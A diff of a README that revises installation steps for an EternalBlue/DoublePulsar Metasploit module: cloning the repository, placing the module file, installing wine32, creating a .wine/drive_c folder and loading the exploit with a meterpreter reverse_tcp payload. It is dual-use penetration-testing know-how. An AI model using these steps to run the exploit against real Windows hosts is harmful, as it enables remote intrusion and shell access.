@@ -9,12 +9,12 @@ One thing I could never find was a full setup guide.  I had to piece this togeth
 # Installation Setup
 
 	1.) git clone https://github.com/w0rtw0rt/EternalBlue to any directory
-	2.) Place eternalblue-doublepulsar.rb file into the /usr/share/metasploit-framework/modules/exploits/windows/smb folder
+	2.) Place eternalblue-doublepulsar.rb file into the /.msf4/modules/exploits/windows/smb folder (mkdir -p to make it)
 	3.) open terminal
 	4.) dpkg --add-architecture i386 && apt-get update && apt-get install wine32
-	5.) add directory in your home directory for .wine (mkdir .wine)
-	6.) cd .wine 
-	7.) mkdir drive_c
+	5.) add directory in your home directory for mkdir -p .wine/drive_c
+	6.)  (removed)
+	7.) (removed)
 	8.) open metasploit (msfconsole)
 	9.) use exploit/windows/smb/eternalblue_doublepulsar (should tab autocomplete if you placed in proper directory)
 	10.) set proper payload for arch (windows/x64/meterpreter/reverse_tcp vs windows/meterpreter/reverse_tcp)
